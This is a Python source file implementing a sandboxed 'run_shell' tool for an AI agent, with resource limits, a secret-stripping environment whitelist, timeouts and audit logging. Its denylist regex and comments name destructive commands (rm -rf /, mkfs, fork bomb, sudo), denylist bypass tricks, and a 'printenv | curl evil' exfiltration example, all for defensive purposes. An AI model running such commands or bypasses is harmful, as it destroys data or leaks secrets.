"""Builtin ``run_shell`` tool — execute a shell command.

The command runs with the agent workspace as its working directory, a
wall-clock timeout, a capped combined stdout+stderr buffer, and a set
of POSIX resource limits applied in a ``preexec_fn`` before exec.

## Security caveat

``run_shell`` is a **real shell** — it is not chrooted, namespaced, or
containerised. The workspace is only its *cwd*; a command run as the
same user as the agent can still read paths outside it, talk to the
network, and call any binary on ``PATH``. The denylist regex
(:data:`_DENY`) is a small backstop against accidents (the model
typing ``rm -rf /`` is the canonical case) — **it is not a security
boundary** and MUST NOT be relied upon to contain a hostile command:
command-injection bypasses are trivial (``r''m -rf /``, base64-decoded
payloads, glob expansion, environment-variable expansion, etc.).

The real isolation lives in three places:

1. **The deployment** — run the agent process as a low-privilege user,
   in a container, in a VM, or behind a seccomp profile.
2. **POSIX resource limits** applied per spawned shell (CPU, address
   space, file size, process count, file descriptors) so a runaway
   command cannot DoS the host.
3. **A minimal environment whitelist** — the gateway's process env
   (which holds provider API keys, gRPC credentials, hook secrets) is
   NOT forwarded to the subprocess; only ``PATH`` / ``LANG`` / ``LC_ALL``
   / ``HOME`` / ``USER`` survive.
"""

from __future__ import annotations

import asyncio
import json
import os
import re
import signal
import sys
import time
from pathlib import Path
from typing import Any

import structlog

from corlinman_agent.coding._common import (
    CodingArgsInvalidError,
    decode_args,
    resolve_workspace,
    workspace_rel,
)

logger = structlog.get_logger(__name__)

RUN_SHELL_TOOL: str = "run_shell"

#: Default / hard-max command timeout (seconds). Lowered from 120s to
#: 60s — anything longer is almost certainly a runaway or a hang, and
#: the rlimit_cpu cap below mirrors this value so wall-clock and CPU
#: budgets agree.
_DEFAULT_TIMEOUT = 30
_MAX_TIMEOUT = 60
#: Cap on combined stdout+stderr returned to the model (chars). Lowered
#: from 30_000 to 16_000 because the reasoning loop now applies its own
#: 8k per-tool-result cap (T1.1); 16k gives the model a useful window
#: while keeping the log spill the source of truth for full output.
_MAX_OUTPUT_CHARS = 16_000
#: Subdirectory inside the workspace where truncated shell output is
#: spilled. Keeps the workspace root uncluttered and gives the model a
#: stable prefix it can ``read_file`` for the full content.
_SHELL_LOG_DIR = ".corlinman"

#: POSIX resource limits applied to every spawned shell. Tuned for a
#: build/test workload (running ``pytest``, ``npm``, ``cargo`` etc.)
#: while still bounding the blast radius of a runaway command.
#:
#: * ``RLIMIT_CPU=60`` — 60 CPU-seconds. The kernel delivers SIGXCPU
#:   when the soft limit is reached; the SIGKILL at the hard limit
#:   guarantees termination.
#: * ``RLIMIT_AS`` — 2 GiB virtual address space cap. Caught by any
#:   later malloc, so the process fails fast instead of OOMing the host.
#:   Disabled on macOS where it interacts poorly with dyld.
#: * ``RLIMIT_FSIZE`` — 100 MiB per-file write cap. A ``dd if=/dev/zero``
#:   gets ``EFBIG`` rather than filling the disk.
#: * ``RLIMIT_NPROC=64`` — guards against fork-bomb-style amplification
#:   from inside the spawned shell.
#: * ``RLIMIT_NOFILE=256`` — generous enough for normal builds, low
#:   enough to bound an fd-exhaustion attack.
_RLIMIT_CPU_SECS = 60
_RLIMIT_AS_BYTES = 2 * 1024 * 1024 * 1024  # 2 GiB
_RLIMIT_FSIZE_BYTES = 100 * 1024 * 1024  # 100 MiB
_RLIMIT_NPROC = 64
_RLIMIT_NOFILE = 256

#: Whitelist of env vars forwarded to the shell child. The gateway's
#: process environment carries provider API keys, gRPC credentials, and
#: hook secrets — those MUST NOT be visible to a model-driven shell.
#: Only the variables a sane build needs are passed through. Add to
#: this list with care.
_ENV_WHITELIST = ("PATH", "LANG", "LC_ALL", "HOME", "USER", "LOGNAME", "TZ")

#: Obvious destructive / privilege patterns refused outright. This is a
#: tripwire against accidents and the most common adversarial
#: completions — NOT a security boundary. See module docstring.
_DENY = re.compile(
    r"""(?ix)
    \brm\s+-[a-z]*r[a-z]*\s+(/|~|\$HOME|\*)   # rm -rf of root / home / *
    | \b(shutdown|reboot|halt|poweroff|init\s+0)\b
    | \bmkfs\b | \bdd\s+if=                    # filesystem wipe / raw dd
    | :\(\)\s*\{.*\};                          # fork bomb
    | \b(sudo|doas|su)\b                       # privilege escalation
    | \bLD_PRELOAD=                            # loader hijack
    | >\s*/dev/(sd|nvme|disk|hd)               # raw-device redirect
    | \bchmod\s+-[a-z]*\s*777\s+/              # chmod 777 /
    """,
)


def _build_child_env() -> dict[str, str]:
    """Return the env passed to the spawned shell.

    Walks the parent process env and keeps only the
    :data:`_ENV_WHITELIST` keys. This is the single chokepoint where
    provider API keys, OAuth tokens, and other secrets are stripped so
    the model-driven shell cannot ``echo $OPENAI_API_KEY`` or
    ``printenv | curl evil``.
    """
    parent = os.environ
    env: dict[str, str] = {}
    for key in _ENV_WHITELIST:
        if key in parent:
            env[key] = parent[key]
    # Bare minimum a shell needs to find binaries; if PATH is missing
    # the model gets a clear error instead of a silent ``command not
    # found`` in a weird state.
    if "PATH" not in env:
        env["PATH"] = "/usr/local/bin:/usr/bin:/bin"
    return env


def _preexec_apply_rlimits() -> None:
    """``preexec_fn`` callable: applies :data:`_RLIMIT_*` then ``setsid``.

    Runs in the forked child between ``fork()`` and ``exec()``. ``resource``
    is POSIX-only — Windows callers skip this hook (we gate on
    :data:`sys.platform` at the call site).

    Each rlimit is applied independently and best-effort: kernels differ
    in which limits they implement (macOS's ``RLIMIT_AS`` interacts
    poorly with dyld; some BSDs lack ``RLIMIT_NPROC``), and the hard
    limit inherited from the parent may already be lower than the
    ceiling we'd like to set. Failures on one limit MUST NOT block the
    spawn — the remaining limits still bound the blast radius.

    ``setsid`` gives the child its own process-group so a timeout can
    ``killpg`` the whole tree (the shell + every command it forked).
    Without this, ``proc.kill()`` only kills the shell wrapper and the
    real workload survives.
    """
    import resource

    def _apply(name: str, soft: int, hard: int) -> None:
        """Best-effort ``setrlimit``: clamp against the current hard
        limit, swallow per-kernel quirks. Order matters: the CPU limit
        runs first so a misbehaving caller still gets bounded
        wall-clock + CPU time.
        """
        rlim_id = getattr(resource, name, None)
        if rlim_id is None:
            return
        try:
            cur_soft, cur_hard = resource.getrlimit(rlim_id)
            # Cannot raise hard limit without privilege; respect it.
            new_hard = (
                min(hard, cur_hard)
                if cur_hard != resource.RLIM_INFINITY
                else hard
            )
            new_soft = min(soft, new_hard)
            resource.setrlimit(rlim_id, (new_soft, new_hard))
        except (ValueError, OSError, resource.error):  # type: ignore[attr-defined]
            # Kernel refused or limit unsupported — every other limit
            # still applies. Swallow rather than blow the spawn.
            pass

    _apply("RLIMIT_CPU", _RLIMIT_CPU_SECS, _RLIMIT_CPU_SECS)
    _apply("RLIMIT_FSIZE", _RLIMIT_FSIZE_BYTES, _RLIMIT_FSIZE_BYTES)
    # RLIMIT_AS is hostile to macOS dyld; skipped on Darwin. Linux is
    # fine, and that's where the most realistic deployments live.
    if sys.platform != "darwin":
        _apply("RLIMIT_AS", _RLIMIT_AS_BYTES, _RLIMIT_AS_BYTES)
    _apply("RLIMIT_NPROC", _RLIMIT_NPROC, _RLIMIT_NPROC)
    _apply("RLIMIT_NOFILE", _RLIMIT_NOFILE, _RLIMIT_NOFILE)
    # New session — so killpg(getpgid(pid)) reaps the whole process tree.
    os.setsid()

#: Splits a command line into top-level segments on shell operators so a
#: denied pattern hidden after ``;`` / ``|`` / ``&&`` is still caught.
_SEGMENT_SPLIT = re.compile(r"[;&|]+|\bthen\b|\bdo\b")


def run_shell_tool_schema() -> dict[str, Any]:
    return {
        "type": "function",
        "function": {
            "name": RUN_SHELL_TOOL,
            "description": (
                "Run a shell command. The working directory is the agent "
                "workspace. Returns combined stdout+stderr and the exit "
                "code. Use for builds, tests, git, file inspection, etc."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "The shell command to execute.",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": (
                            f"Timeout in seconds (default {_DEFAULT_TIMEOUT}, "
                            f"max {_MAX_TIMEOUT})."
                        ),
                    },
                },
                "required": ["command"],
                "additionalProperties": False,
            },
        },
    }


async def dispatch_run_shell(
    *, args_json: bytes | str, workspace: Path | None = None
) -> str:
    """Execute a shell command in the workspace. JSON envelope; never raises."""
    try:
        raw = decode_args(args_json)
    except CodingArgsInvalidError as exc:
        return json.dumps({"error": f"args_invalid: {exc.message}"})

    command = raw.get("command")
    if not isinstance(command, str) or not command.strip():
        return json.dumps({"error": "args_invalid: missing or empty 'command'"})
    command = command.strip()
    # Screen the whole line *and* every operator-split segment, so a
    # denied pattern smuggled after ';' / '|' / '&&' is still caught.
    for segment in [command, *_SEGMENT_SPLIT.split(command)]:
        if _DENY.search(segment):
            logger.warning("run_shell.refused", command=command[:200])
            return json.dumps(
                {
                    "command": command,
                    "error": "command_refused: destructive pattern",
                }
            )

    timeout = raw.get("timeout", _DEFAULT_TIMEOUT)
    try:
        timeout = min(_MAX_TIMEOUT, max(1, int(timeout)))
    except (TypeError, ValueError):
        timeout = _DEFAULT_TIMEOUT

    ws = resolve_workspace(workspace)

    # POSIX-only: apply rlimits + setsid before exec. Skipped on Windows
    # (CPython's ``preexec_fn`` is POSIX-only); the workspace + env
    # whitelist still provide some confinement there.
    spawn_kwargs: dict[str, Any] = {
        "cwd": str(ws),
        "stdout": asyncio.subprocess.PIPE,
        "stderr": asyncio.subprocess.STDOUT,
        "env": _build_child_env(),
    }
    if sys.platform != "win32":
        spawn_kwargs["preexec_fn"] = _preexec_apply_rlimits

    try:
        proc = await asyncio.create_subprocess_shell(command, **spawn_kwargs)
    except OSError as exc:
        return json.dumps({"command": command, "error": f"spawn_failed: {exc}"})

    def _kill_process_group() -> None:
        """Kill the spawned shell AND every command it forked.

        ``proc.kill()`` only delivers SIGKILL to the immediate child
        (the shell wrapper). If the shell ran ``sleep 9999 &`` or even
        ``sleep 9999`` synchronously, the sleep survives the wrapper's
        death unless we signal the whole process group. ``setsid`` in
        the preexec_fn makes the child its own session leader, so
        ``killpg(getpgid(pid), SIGKILL)`` reaps the whole tree.
        """
        if sys.platform == "win32":
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            return
        try:
            pgid = os.getpgid(proc.pid)
            os.killpg(pgid, signal.SIGKILL)
        except (ProcessLookupError, PermissionError):
            # Already gone, or — for tests where preexec_fn was bypassed —
            # the child isn't a session leader. Fall back to single-process kill.
            try:
                proc.kill()
            except ProcessLookupError:
                pass

    try:
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        _kill_process_group()
        try:
            await proc.wait()
        except ProcessLookupError:  # pragma: no cover — race
            pass
        return json.dumps(
            {
                "command": command,
                "error": f"timeout: killed after {timeout}s",
                "exit_code": None,
            },
            ensure_ascii=False,
        )
    except Exception as exc:  # noqa: BLE001 — dispatcher must never raise
        logger.exception("run_shell.unexpected", command=command)
        return json.dumps({"command": command, "error": f"run_failed: {exc}"})

    output = (stdout or b"").decode("utf-8", errors="replace")
    truncated = len(output) > _MAX_OUTPUT_CHARS
    log_path: str | None = None
    if truncated:
        # T1.1: spill the full output to a workspace log file so the
        # model can ``read_file`` it later if it needs the head/middle,
        # then keep the **tail** of the output in the inline payload.
        # Shell errors and pytest failure summaries live at the bottom —
        # the head is mostly noise we don't want to feed back.
        log_dir = ws / _SHELL_LOG_DIR
        try:
            log_dir.mkdir(parents=True, exist_ok=True)
            log_file = log_dir / f"run_shell_{int(time.time() * 1000)}.log"
            log_file.write_text(output, encoding="utf-8", errors="replace")
            log_path = workspace_rel(ws, log_file)
        except OSError as exc:  # pragma: no cover — disk-full / readonly
            logger.warning(
                "run_shell.spill_failed", error=str(exc), command=command[:200]
            )
        tail = output[-_MAX_OUTPUT_CHARS:]
        prefix_path = log_path or "<spill failed>"
        output = f"…(output truncated, full log at {prefix_path})\n{tail}"
    # Audit line — every shell command + its exit code is logged.
    logger.info(
        "run_shell.executed",
        command=command[:200],
        exit_code=proc.returncode,
        truncated=truncated,
        log_path=log_path,
    )
    envelope: dict[str, Any] = {
        "command": command,
        "exit_code": proc.returncode,
        "output": output,
        "truncated": truncated,
    }
    if log_path is not None:
        envelope["log_path"] = log_path
    return json.dumps(envelope, ensure_ascii=False)


__all__ = [
    "RUN_SHELL_TOOL",
    "dispatch_run_shell",
    "run_shell_tool_schema",
]
